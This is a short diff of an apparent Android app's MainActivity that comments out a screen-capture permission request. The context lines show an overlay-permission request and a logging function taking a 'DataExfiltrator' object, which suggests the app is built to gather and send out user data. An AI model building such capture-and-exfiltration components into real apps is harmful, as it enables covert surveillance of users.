@@ -125,10 +125,10 @@ class MainActivity : ComponentActivity() {
         requestOverlayPermission()
 
         // Request screen capture permission
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
-            val projectionManager = getSystemService(MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
-            screenCaptureLauncher.launch(projectionManager.createScreenCaptureIntent())
-        }
+//        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
+//            val projectionManager = getSystemService(MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
+//            screenCaptureLauncher.launch(projectionManager.createScreenCaptureIntent())
+//        }
 
         enableEdgeToEdge()
         fun logEvent(exfiltrator: DataExfiltrator, event: String, value: String) {
